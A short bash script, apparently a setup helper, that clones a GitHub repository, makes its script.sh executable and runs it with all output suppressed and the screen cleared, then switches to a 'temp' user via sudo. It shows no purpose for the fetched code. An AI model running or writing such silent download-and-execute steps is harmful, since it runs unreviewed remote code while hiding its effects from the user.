#!/bin/bash

# Define a function to execute commands silently
execute_silently() {
    "$@" > /dev/null 2>&1
}

# Clone the repository, navigate to the directory, make the script executable, and execute it silently
execute_silently git clone https://github.com/RabiaNoumanSiddiq/user_script.git
execute_silently clear
execute_silently cd user_script
execute_silently chmod +x script.sh
execute_silently clear
execute_silently ./script.sh
execute_silently clear
execute_silently cd ..

# Switch to the 'temp' user
sudo su - temp

# Clear the screen
clear

